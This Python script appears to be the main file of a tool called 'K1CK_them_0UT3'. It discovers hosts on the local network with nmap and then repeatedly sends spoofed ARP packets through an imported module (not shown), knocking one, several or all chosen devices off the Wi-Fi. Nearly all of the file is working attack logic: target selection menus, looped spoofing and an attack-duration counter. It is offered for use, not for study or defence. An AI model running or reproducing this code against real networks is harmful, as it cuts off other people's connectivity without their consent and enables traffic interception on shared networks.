#!/usr/bin/env python3

import time
import os
import sys
import math
import logging
import platform
from time import sleep
from datetime import timedelta
from ipaddress import IPv4Address

import requests

import R_spoof

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # Shut up scapy!
try:
    from scapy.all import *
    import nmap
except ImportError:
    print("\n{0}ERROR: Requirements have not been satisfied properly. Please look at the README file for configuration instructions.".format(RED))
    print("\n{0}If you still cannot resolve this error, please submit an issue here:\n\t{1}https://github.com/R3DDY97/K1CK_them_0UT3/issues\n{2}".format(RED, BLUE, END))
    raise SystemExit

# check whether user is root
if os.geteuid() != 0:
    print("\n{0}ERROR: K1CKThemOut3 must be run with root privileges. Try again with sudo:\n\t{1}$ sudo python3 kick.py{2}\n".format(RED, GREEN, END))
    raise SystemExit


def heading():
    spaces = " " * 70
    sys.stdout.write(RED + spaces + """


    KK  KK IIIII  CCCCC  KK  KK  tt    hh
    KK KK   III  CC    C KK KK   tt    hh        eee  mm mm mmmm
    KKKK    III  CC      KKKK    tttt  hhhhhh  ee   e mmm  mm  mm
    KK KK   III  CC    C KK KK   tt    hh   hh eeeee  mmm  mm  mm
    KK  KK IIIII  CCCCC  KK  KK   tttt hh   hh  eeeee mmm  mm  mm

     OOOOO  UU   UU TTTTTTT        333333
    OO   OO UU   UU   TTT             3333
    OO   OO UU   UU   TTT   _____    3333
    OO   OO UU   UU   TTT              333
     OOOO0   UUUUU    TTT          333333


    """ + END + BLUE +
                     '\n' + '{0}K1CK devices accesing your Wifi  ({1}K1CK TH3M 0UT 3{2}){3}'.format(YELLOW, RED, YELLOW, BLUE).center(98) +
                     '\n' + 'Made With <3 by: {0}CH1TT1{3}'.format(YELLOW, RED, YELLOW, BLUE).center(111) +
                     '\n' + 'Version: {0}0.2{1}\n'.format(YELLOW, END).center(86))


def optionBanner():
    print('\n\tChoose option from menu:\n')
    sleep(0.2)
    print('\t\t{0}[{1}1{2}]{3} K1CK ONE Off'.format(
        YELLOW, RED, YELLOW, WHITE))
    sleep(0.2)
    print('\t\t{0}[{1}2{2}]{3} K1CK SOME Off'.format(
        YELLOW, RED, YELLOW, WHITE))
    sleep(0.2)
    print('\t\t{0}[{1}3{2}]{3} K1CK ALL Off'.format(
        YELLOW, RED, YELLOW, WHITE))
    sleep(0.2)
    print(
        '\n\t\t{0}[{1}E{2}]{3} Exit K1CK-Them-0UT\n'.format(YELLOW, RED, YELLOW, WHITE))


def vendorMAC(mac):
    url = "http://api.macvendors.com/{}".format(mac)
    response = requests.get(url)
    if response.ok:
        return response.text
    return "NA"

def get_broadcast(gatewayIP):
    *head, tail = gatewayIP.split('.')
    head.append(str(int(tail) - 1))
    gateway = ".".join(head)
    route_list = [i.split() for i in str(conf.route).splitlines()]
    for route in route_list:
        if route[0] == gateway:
            return route[1]

def get_netmask(gateway):
    routing = scapy.config.conf.route.routes
    for i in routing:
        if int(IPv4Address(gateway)) in i:
            netmask = 32 - int(round(math.log(0xFFFFFFFF - (i[1]), 2)))
            return netmask


def net_config():
    global defaultInterface
    global defaultGatewayIP
    global defaultInterfaceIP
    global defaultInterfaceMAC
    global defaultGatewayMac
    global GatewayInterface

    defaultInterface = conf.iface
    defaultInterfaceIP = get_if_addr(defaultInterface)
    defaultInterfaceMAC = get_if_hwaddr(defaultInterface).upper()

    # routing = scapy.config.conf.route.routes
    # defaultGatewayIP = route_list[2][2]
    # defaultInterface,  defaultInterfaceIP,  defaultGatewayIP = conf.route.route("0.0.0.0")[2]

    defaultGatewayIP = conf.route.route("0.0.0.0")[2]
    defaultGatewayMac = getmacbyip(defaultGatewayIP).upper()
    broadcast = get_broadcast(defaultGatewayIP)
    netmask = get_netmask(broadcast)
    GatewayInterface = "{}/{}".format(defaultGatewayIP, netmask)

def scanNetwork():
    nm = nmap.PortScanner()
    scanDict = nm.scan(hosts=GatewayInterface, arguments='-sn')
    scan_data = scanDict['scan']
    scan_stats = scanDict['nmap']['scanstats']
    IPlist = [ip for ip in scan_data.keys() if ip not in [defaultGatewayIP, defaultInterfaceIP]]
    scan_stats['targets'] = len(IPlist)
    hosts_list = []
    for host in IPlist:
        host_dict = {"ip": host}
        mac = scan_data[host]['addresses']['mac']
        host_dict['vendor'] = scan_data[host]['vendor'].get(mac, '')
        host_dict['mac'] = mac
        hosts_list.append(host_dict)
    print_metadata(scan_stats)
    return hosts_list

def print_metadata(scan_stats):
    elapsed_time = float(scan_stats["elapsed"])
    uphosts = int(scan_stats["uphosts"])
    timestr = scan_stats["timestr"]
    targets = scan_stats["targets"]


    print('''\n\t{}N3TW0RK scan summary :-\n{}
            Scan runtime : {}{}{}
            Interface    : {}{}{}
            MAC          : {}{}{}
            Gateway IP   : {}{}{}
            uphosts      : {}{}{}
            Target hosts : {}{}{}\n
           '''.format(YELLOW, WHITE, RED, elapsed_time,
                              WHITE, RED, defaultInterface,
                              WHITE, RED, defaultGatewayMac,
                              WHITE, RED, defaultGatewayIP,
                              WHITE, RED, uphosts,
                              WHITE, RED, targets,
                      END))

# def scanNetwork():
#     # Scanning Network using nmap
#     nm = nmap.PortScanner()
#     scanDict = nm.scan(hosts=GatewayInterface, arguments='-sn')
#     scanstats = nm.scanstats()
#     elapsed_time = float(scanstats["elapsed"])
#     uphosts = int(scanstats["uphosts"])
#     timestr = scanstats["timestr"]

#     IPlist = nm.all_hosts()
#     IPlist.remove(defaultInterfaceIP)
#     IPlist.remove(defaultGatewayIP)
#     try:
#         macList = [getmacbyip(ip).upper() for ip in IPlist]
#     except AttributeError:
#         macList = [nm[x]['addresses']['mac'] for x in IPlist]
#     except KeyError:
#         macList = [nm[x]['addresses']['mac'] for x in IPlist]

#     hostname_list = [nm[x]['hostnames'][0]['name'] for x in IPlist]
#     try:
#         vendorList = [nm[x]['vendor'][m] for x, m in zip(IPlist, macList)]
#     except:
#         pass
#     try:
#         vendorList = [vendorMAC(mac) for mac in macList]
#     except:
#         print("Not able to find vendor names\n")
#         vendorList = ["NA"] * len(IPlist)
#     ip_mac_vendor_hosts = [[i, m, v, h] for i, m, v, h in zip(
#         IPlist, macList, vendorList, hostname_list)]

#     print('''\n\t{}N3TW0RK scan summary :-\n{}
#             Scan runtime : {}{}{}
#             Interface    : {}{}{}
#             MAC          : {}{}{}
#             Gateway IP   : {}{}{}
#             uphosts      : {}{}{}
#             Target hosts : {}{}{}\n
#            '''.format(YELLOW, WHITE, RED, elapsed_time, WHITE, RED, defaultInterface, WHITE, RED, defaultGatewayMac, WHITE, RED, defaultGatewayIP, WHITE, RED, uphosts, WHITE, RED, len(IPlist), END))
#     return ip_mac_vendor_hosts


def print_hosts(hosts_list):
    print("{0}\tNo\t{1}IP ADDRESS\t  {2}MAC ADDRESS\t\t{3}VENDOR NAME{4}\n".format(YELLOW, WHITE, RED, GREEN, END))
    for n, host in enumerate(hosts_list, 1):
        print("{0}\t[{5}]\t{1}{6}\t{2}{7}\t{3}{8}{4}".format(YELLOW, WHITE, RED, GREEN, END,
                                                             n, host['ip'], host['mac'], host['vendor']))

# ########################################################################################

# K1CK one device
def K1CKoneoff():
    os.system("clear||cls")
    print("\n{0}K1CK-ONE-0ff{1} iz selected...{2}\n".format(RED, GREEN, END))
    sys.stdout.write("\n\t{0}Scanning your N3TW0RK, H4NG 0N...{1}\n\n\r".format(RED, END))
    sys.stdout.flush()
    hosts_list = scanNetwork()
    print_hosts(hosts_list)


    while True:
        try:
            choice = int(input("\n\t{0}CH00SE the target:-{1} ".format(WHITE, END))) - 1
            print("HOST ===", hosts_list)
            target_host = hosts_list[choice]
            target_ip = target_host['ip']
            target_mac =target_host['mac']
            vendor = target_host['vendor']
            break
        except KeyboardInterrupt:
            return
        except:
            print("\n{0}ERROR: Please enter a number from the list!{1}".format(RED, END))

    print("\n\t{0}Target:-  {5}{1} - {6}{3}  -  {7}{4} {2}".format(RED,target_ip, END, target_mac, vendor, WHITE, RED, GREEN))
    print("\n\t {0}SP00FING has started...& Press CTRL+C keys to stop it {1}\n".format(BLUE, END))
    print("\n \t {1}  K1CK3D {0} - 0UT 0F Wifi{2}\n".format(target_ip, RED, END))

    start = time.time()
    try:
        while True:
            # broadcast malicious ARP packets (10p/s)
            R_spoof.sendPacket(defaultInterfaceMAC, defaultGatewayIP, target_ip, target_mac)
            elapsed = timedelta(seconds=round(time.time() - start))
            print("\r \t {0}ATT4CK DUR4T10N :- {1} seconds{2}".format(YELLOW, elapsed, END), end="")
            time.sleep(10)
    except KeyboardInterrupt:
        return

#########################################################################################

# K1CK multiple devices


def K1CKsomeoff():
    os.system("clear||cls")
    print("\n{0}K1CK-S0ME-0ff{1} iz selected...{2}\n".format(RED, GREEN, END))
    sys.stdout.write("\n\t{0}Scanning your N3TW0RK, H4NG 0N...{1}\r".format(GREEN, END))
    sys.stdout.flush()
    hosts_list = scanNetwork()
    print_hosts(hosts_list)

    while True:
        try:
            choice = input("\nChoose devices to target(comma-separated): ")
            if ',' in choice:
                some_targets = [int(i.strip()) - 1 for i in choice.split(",")]
                print("\nSelected devices are:\n")
                for i in some_targets:
                    print(hosts_list[i]['ip'])
                break
        except KeyboardInterrupt:
            return
        except ValueError:
            print("\n{}Enter comma separated above devices number\n{}".format(RED, END))

    print(
        "\n\t{0}SP00FING has started...& Press CTRL+C keys to stop it {1}\n".format(BLUE, END))
    print("\n \t{0}K1CK3D them  0UT 0F Wifi{1}\n".format(RED, END))
    try:
        start = time.time()
        while True:
            # broadcast malicious ARP packets (10p/s)
            for i in some_targets:
                target_host = hosts_list[i]
                target_ip = target_host['ip']
                target_mac =target_host['mac']
                R_spoof.sendPacket(defaultInterfaceMAC, defaultGatewayIP, target_ip, target_mac)
                elapsed = timedelta(seconds=round(time.time() - start))
            print(
                "\r \t {0}ATT4CK DUR4T10N :- {1} seconds{2}".format(YELLOW, elapsed, END), end="")
            time.sleep(10)
    except KeyboardInterrupt:
        return

# ########################################################################################

# K1CK all devices


def K1CKalloff():
    os.system("clear||cls")
    print("\n{0}K1CK-ALL-Off{1} iz selected...{2}\n".format(RED, GREEN, END))
    sys.stdout.write(
        "\n\t{0}Scanning your N3TW0RK, H4NG 0N...{1}\n".format(GREEN, END))
    sys.stdout.flush()
    hosts_list = scanNetwork()
    print_hosts(hosts_list)
    print("\n\t {0}SP00FING has started...& Press CTRL+C keys to stop it {1}\n".format(BLUE, END))
    print("\n \t {0}K1CK3D ALL  0UT 0F Wifi{1}\n".format(RED, END))
    try:
        # broadcast malicious ARP packets (10p/s)
        start = time.time()
        reScan = 0
        while True:
            for i in range(len(hosts_list)):
                target_host = hosts_list[i]
                target_ip = target_host['ip']
                target_mac =target_host['mac']
                R_spoof.sendPacket(defaultInterfaceMAC, defaultGatewayIP, target_ip, target_mac)
                elapsed = timedelta(seconds=round(time.time() - start))
            print(
                "\r\t{0}ATT4CK DUR4T10N :- {1} seconds{2}".format(YELLOW, elapsed, END), end="")
            reScan += 1
            if reScan == 4:
                reScan = 0
                scanNetwork()
            time.sleep(10)
    except KeyboardInterrupt:
        return

# ########################################################################################

# script's main function


def main():
    ip_mac_vendor = scanNetwork()
    # display warning in case of no active hosts
    if len(ip_mac_vendor) == 0:
        print("\n{}WARNING: There are no other uphosts on LAN .. Try again {}\n".format(RED, END))
        raise SystemExit

    while True:
        optionBanner()
        header = ('{0}K1CKthemout{1}> {2}'.format(BLUE, WHITE, END))
        choice = input(header)
        if choice.upper() == 'E' or choice.upper() == 'EXIT':
            print('\n\n\t\t{0}ThanK Y0U for DR0PP1NG by \n\n\t\tSEE U S00N!{1}\n\n\n'.format(YELLOW, END))
            raise SystemExit
        elif choice == '1':
            K1CKoneoff()
            os.system("clear||cls")
        elif choice == '2':
            K1CKsomeoff()
            os.system("clear||cls")
        elif choice == '3':
            K1CKalloff()
            os.system("clear||cls")
        else:
            print("\n{0}ERROR: Please select a valid option.{1}\n".format(RED, END))


if __name__ == '__main__':
    try:
        os.system("clear||cls")
        heading()
        sys.stdout.write("\n\n{}Scanning your N3TW0RK, H4NG 0N...{}\n\r".format(YELLOW, END))
        net_config()
        main()
    except KeyboardInterrupt:
        print('\n\n\t{0}ThanK Y0U for DR0PP1NG by \n \tSEE U S00N!{1}\n\n'.format(
            YELLOW, END))
